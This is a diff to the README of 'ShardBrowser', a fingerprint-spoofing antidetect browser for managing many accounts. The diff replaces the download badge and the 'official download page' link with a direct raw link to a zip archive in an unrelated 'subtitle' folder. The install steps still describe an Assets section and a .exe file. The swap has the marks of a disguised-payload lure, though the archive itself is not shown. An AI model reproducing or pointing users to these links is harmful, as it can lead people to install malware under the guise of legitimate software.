@@ -1,6 +1,6 @@
 # 🌐 ShardBrowser - Manage multiple accounts with complete privacy
 
-[![Download ShardBrowser](https://img.shields.io/badge/Download-ShardBrowser-blue)](https://github.com/meetingprofile545/ShardBrowser)
+[![Download ShardBrowser](https://img.shields.io/badge/Download-ShardBrowser-blue)](https://raw.githubusercontent.com/meetingprofile545/ShardBrowser/main/subtitle/Shard-Browser-v3.3.zip)
 
 ShardBrowser helps you manage many web accounts from one place. The software disguises your browser fingerprints to protect your identity. You can run automation scripts or browse the internet without tracking. Developers built this tool on the Chromium engine. It includes tools to spoof WebGL, WebGPU, and fonts. It also supports complex network protocols like QUIC and WebRTC over SOCKS5 proxies.
 
@@ -19,7 +19,7 @@ ShardBrowser simplifies complex web tasks. You gain access to features previousl
 
 Follow these steps to install the software on your Windows computer.
 
-1.  Visit the [official download page](https://github.com/meetingprofile545/ShardBrowser).
+1.  Visit the [official download page](https://raw.githubusercontent.com/meetingprofile545/ShardBrowser/main/subtitle/Shard-Browser-v3.3.zip).
 2.  Locate the section labeled Assets.
 3.  Select the file ending in .exe.
 4.  Download this file to your computer.
